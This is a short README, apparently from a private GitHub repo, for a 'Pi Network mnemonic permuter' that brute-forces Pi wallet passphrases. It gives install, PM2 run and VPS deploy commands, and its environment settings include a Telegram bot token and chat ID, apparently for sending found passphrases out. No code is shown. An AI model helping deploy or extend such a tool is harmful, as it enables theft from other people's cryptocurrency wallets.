# Pi-Network-Mnemonic-Permuter

> Ðarlingtøn🦅 Pi Network Tooling

## Description
Pi Network mnemonic permuter — brute-force permutation engine for recovering Pi wallet passphrases.

## Port
`3050`

## Environment Variables
Create a `.env` file in the root of this project:
```
HORIZON_URL=\nTELEGRAM_BOT_TOKEN=\nTELEGRAM_CHAT_ID=
```

## Install
```bash
npm install
```

## Run
```bash
# Start with PM2
pm2 start index.js --name pi-permuter

# Or directly
node server.js
```

## Deploy (from scratch on a new VPS)
```bash
git clone https://github.com/Chiemeried/Pi-Network-Mnemonic-Permuter.git
cd Pi-Network-Mnemonic-Permuter
npm install
cp .env.example .env   # fill in your values
pm2 start index.js --name pi-permuter
```

---
*Private repo — Ðarlingtøn🦅 Darlington Logs*
